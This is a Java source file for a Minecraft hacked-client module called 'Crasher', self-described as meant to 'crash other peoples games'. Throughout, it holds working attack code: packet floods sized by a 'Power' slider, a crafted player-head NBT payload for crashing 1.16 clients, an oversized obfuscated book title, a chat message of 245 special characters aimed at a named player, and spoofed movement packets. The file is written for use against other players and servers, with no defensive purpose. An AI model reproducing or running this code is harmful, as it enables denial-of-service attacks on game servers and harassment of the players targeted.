package net.shadow.feature.module;

import net.minecraft.client.option.ChatVisibility;
import net.minecraft.client.util.math.MatrixStack;
import net.minecraft.entity.Entity;
import net.minecraft.item.BlockItem;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.StringNbtReader;
import net.minecraft.network.Packet;
import net.minecraft.network.packet.c2s.play.*;
import net.minecraft.network.packet.s2c.play.PlaySoundS2CPacket;
import net.minecraft.util.Arm;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.hit.EntityHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;
import net.shadow.Shadow;
import net.shadow.event.events.*;
import net.shadow.feature.base.Module;
import net.shadow.feature.base.ModuleType;
import net.shadow.feature.configuration.CustomValue;
import net.shadow.feature.configuration.MultiValue;
import net.shadow.feature.configuration.SliderValue;
import net.shadow.utils.ChatUtils;
import net.shadow.utils.RenderUtils;

import java.awt.*;
import java.util.List;
import java.util.*;

public class ClientCrasherModule extends Module implements LeftClick, ChatInput, PacketInput, RenderListener, PacketOutput {
    static BlockPos selectedbreaker = null;
    static boolean justbrokeablock = false;
    final MultiValue mode = this.config.create("Mode", "Offhand", "Offhand", "RapidInteract", "InteractShot", "LagBook", "RevSkylight", "Poof", "Fling");
    final SliderValue power = this.config.create("Power", 2000, 1, 10000, 1);
    final CustomValue<String> target2 = this.config.create("Target", "Target for minehut mode");
    final List<BlockPos> renders = new ArrayList<>();

    public ClientCrasherModule() {
        super("Crasher", "crash other peoples games", ModuleType.EXPLOIT);
    }

    @Override
    public String getVanityName() {
        return this.getName() + " [" + mode.getThis() + "]";
    }

    @Override
    public void onEnable() {
        Shadow.getEventSystem().add(RenderListener.class, this);
        if (mode.getThis().equalsIgnoreCase("lagbook")) {
            if (Shadow.c.player.getInventory().getMainHandStack().getItem() != Items.WRITABLE_BOOK) {
                ChatUtils.message("hold a book and quill in your main hand");
                return;
            }
            String bigstring = "W".repeat(128);
            Optional<String> title = Optional.of("\u00a7k" + bigstring);
            List<String> pages = List.of("Very Cool Book");
            Shadow.c.player.networkHandler.sendPacket(new BookUpdateC2SPacket(Shadow.c.player.getInventory().selectedSlot, pages, title));
            ChatUtils.message("Wrote Book!");
            this.setEnabled(false);
        }
        if (mode.getThis().equalsIgnoreCase("minehut")) {
            SplittableRandom random = new SplittableRandom();
            String s = "￿".repeat(245);
            String x = "/msg " + target2.getThis() + " &k&a&l" + s;
            Shadow.c.player.networkHandler.sendPacket(new ChatMessageC2SPacket(x));
            return;
        }
        if (mode.getThis().equalsIgnoreCase("poof")) {
            new Thread(() -> {
                ItemStack stack = new ItemStack(Items.PLAYER_HEAD, 1);
                ChatUtils.message("Crashing... This only works on 1.16 players!");
                try {
                    stack.setNbt(StringNbtReader.parse("{SkullOwner:{Id:[I;-11783291,-84552235,-74553283,-84863242],Properties:{textures:[{Value:\"eyJ0ZXh0dXJlcyI6eyJTS0lOIjp7InVybCI6Imh0dHBzOi8vZWR1Y2F0aW9uLm1pbmVjcmFmdC5uZXQvd3AtY29udGVudC91cGxvYWRzLzFweC5wbmcifX19\"}]},Name:\"Poof\"},display:{Name:'{\"text\":\"Poof\"}'}}"));
                } catch (Exception ignored) {
                }
                Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(5, stack));
                try {
                    Thread.sleep(500);
                } catch (Exception ignored) {
                }
                ItemStack LITERALAIR = new ItemStack(Items.AIR, 1);
                Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(5, LITERALAIR));
            }).start();
            this.setEnabled(false);
        }
        if (mode.getThis().equalsIgnoreCase("revskylight")) {
            Shadow.getEventSystem().add(PacketOutput.class, this);
        }
        selectedbreaker = Shadow.c.player.getBlockPos().offset(Direction.DOWN, 1);
        Shadow.getEventSystem().add(LeftClick.class, this);
        Shadow.getEventSystem().add(ChatInput.class, this);
        Shadow.getEventSystem().add(PacketInput.class, this);
    }

    @Override
    public void onDisable() {
        Shadow.getEventSystem().remove(LeftClick.class, this);
        Shadow.getEventSystem().remove(ChatInput.class, this);
        Shadow.getEventSystem().remove(PacketInput.class, this);
        Shadow.getEventSystem().remove(RenderListener.class, this);
        if (mode.getThis().equalsIgnoreCase("revskylight")) {
            Shadow.getEventSystem().remove(PacketOutput.class, this);
        }
        renders.clear();
    }

    @Override
    public void onUpdate() {

        switch (mode.getThis().toLowerCase()) {
            case "offhand":
                for (int i = 0; i < power.getThis(); i++) {
                    Shadow.c.player.networkHandler.sendPacket(new PlayerActionC2SPacket(PlayerActionC2SPacket.Action.SWAP_ITEM_WITH_OFFHAND, new BlockPos(0, 0, 0), Direction.UP));
                }
                break;

            case "rapidinteract":
                if (!(Shadow.c.crosshairTarget instanceof EntityHitResult))
                    return;

                Entity target = ((EntityHitResult) Shadow.c.crosshairTarget).getEntity();
                for (int i = 0; i < power.getThis(); i++) {
                    Shadow.c.player.networkHandler.sendPacket(PlayerInteractEntityC2SPacket.attack(target, Shadow.c.player.isSneaking()));
                }
                break;


            case "paralyze":


            case "fling":
                for (int i = 0; i < power.getThis(); i++) {
                    Shadow.c.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.OnGroundOnly(true));
                }
                break;

            case "revskylight":
                Shadow.c.player.updatePosition(selectedbreaker.getX() + 0.5, selectedbreaker.getY() + 1, selectedbreaker.getZ() + 0.5);
                int b4slot = Shadow.c.player.getInventory().selectedSlot;
                int slot = TheJ();
                if (slot == -1) return;
                if (Shadow.c.player.world.getBlockState(selectedbreaker).isAir()) {
                    Shadow.c.player.getInventory().selectedSlot = slot;
                    Shadow.c.interactionManager.interactBlock(Shadow.c.player, Shadow.c.world, Hand.MAIN_HAND, new BlockHitResult(new Vec3d(selectedbreaker.getX(), selectedbreaker.getY(), selectedbreaker.getZ()).add(0.5, 0.5, 0.5), Direction.UP, selectedbreaker, false));
                    Shadow.c.player.getInventory().selectedSlot = b4slot;
                    return;
                }
                Shadow.c.getNetworkHandler().sendPacket(new PlayerActionC2SPacket(PlayerActionC2SPacket.Action.STOP_DESTROY_BLOCK, selectedbreaker, Direction.UP));
                Shadow.c.interactionManager.updateBlockBreakingProgress(selectedbreaker, Direction.UP);

                break;


            case "model":
                for (int i = 0; i < power.getThis(); i++) {
                    Shadow.c.player.networkHandler.sendPacket(new ClientSettingsC2SPacket("en_us", 8, ChatVisibility.FULL, true, 0, Arm.RIGHT, false, true));
                    Shadow.c.player.networkHandler.sendPacket(new ClientSettingsC2SPacket("en_us", 8, ChatVisibility.FULL, true, 127, Arm.RIGHT, false, true));
                }
                break;
        }
    }

    @Override
    public void onRender() {

    }

    @Override
    public void onReceivedPacket(PacketInputEvent event) {
        if (event.getPacket() instanceof PlaySoundS2CPacket)
            event.cancel();
    }

    @Override
    public void onReceivedMessage(ChatInputEvent event) {
        if (mode.getThis().equalsIgnoreCase("minehut")) {
            event.cancel();
            this.setEnabled(false);
        }
    }

    @Override
    public void onLeftClick(LeftClickEvent event) {
        if (mode.getThis().equalsIgnoreCase("interactshot")) {
            if (!(Shadow.c.crosshairTarget instanceof EntityHitResult)) return;
            Entity target = ((EntityHitResult) Shadow.c.crosshairTarget).getEntity();
            for (int i = 0; i < power.getThis(); i++) {
                Shadow.c.player.networkHandler.sendPacket(PlayerInteractEntityC2SPacket.attack(target, Shadow.c.player.isSneaking()));
            }
        }
        if (mode.getThis().equalsIgnoreCase("offhand")) {
            for (int i = 0; i < power.getThis(); i++) {
                Shadow.c.player.networkHandler.sendPacket(new PlayerActionC2SPacket(PlayerActionC2SPacket.Action.SWAP_ITEM_WITH_OFFHAND, new BlockPos(0, 0, 0), Direction.UP));
            }
        }
    }

    @Override
    public void onRender(float partialTicks, MatrixStack matrix) {
        for (BlockPos render : renders) {
            Vec3d vp = new Vec3d(render.getX(), render.getY(), render.getZ());
            RenderUtils.renderObject(vp, new Vec3d(1, 1, 1), new Color(53, 53, 53, 100), matrix);
        }
        if (mode.getThis().equalsIgnoreCase("revskylight")) {
            Vec3d vp = new Vec3d(selectedbreaker.getX(), selectedbreaker.getY(), selectedbreaker.getZ());
            RenderUtils.renderObject(vp, new Vec3d(1, 1, 1), new Color(53, 53, 53, 100), matrix);
        }
    }

    private int TheJ() {
        for (int i = 0; i < 9; i++) {
            ItemStack stack = Shadow.c.player.getInventory().getStack(i);
            if (stack.isEmpty() || !(stack.getItem() instanceof BlockItem))
                continue;

            return i;
        }
        return -1;
    }

    @Override
    public void onSentPacket(PacketOutputEvent event) {
        if (!(event.getPacket() instanceof PlayerMoveC2SPacket packet))
            return;

        if (!(packet instanceof PlayerMoveC2SPacket.PositionAndOnGround || packet instanceof PlayerMoveC2SPacket.Full))
            return;

        if (Shadow.c.player.input == null) {
            event.cancel();
            return;
        }

        event.cancel();
        double x = packet.getX(0);
        double y = packet.getY(0);
        double z = packet.getZ(0);

        Packet<?> newPacket;
        Random r = new Random();
        if (packet instanceof PlayerMoveC2SPacket.PositionAndOnGround)
            newPacket = new PlayerMoveC2SPacket.PositionAndOnGround(x, y + r.nextDouble(), z, true);
        else
            newPacket = new PlayerMoveC2SPacket.Full(x, y + r.nextDouble(), z, packet.getYaw(0),
                    packet.getPitch(0), true);

        Shadow.c.player.networkHandler.getConnection().send(newPacket);
    }
}
